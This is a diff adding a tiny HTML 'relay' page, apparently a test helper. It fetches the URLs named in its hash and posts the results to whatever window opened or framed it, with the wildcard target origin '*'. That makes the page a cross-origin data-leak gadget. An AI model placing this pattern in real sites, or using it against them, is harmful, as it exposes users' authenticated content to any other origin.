@@ -1,0 +1,4 @@
+<!DOCTYPE html><meta charset="utf-8"><title>relay</title><body>relay<script>
+const ns=location.hash.slice(1).split(',');
+Promise.all(ns.map(n=>fetch(n).then(r=>r.blob()).then(b=>({n,b})))).then(a=>{(window.opener||parent).postMessage({k570:a},'*');document.title='sent '+a.length;}).catch(e=>document.title='ERR '+e);
+</script>
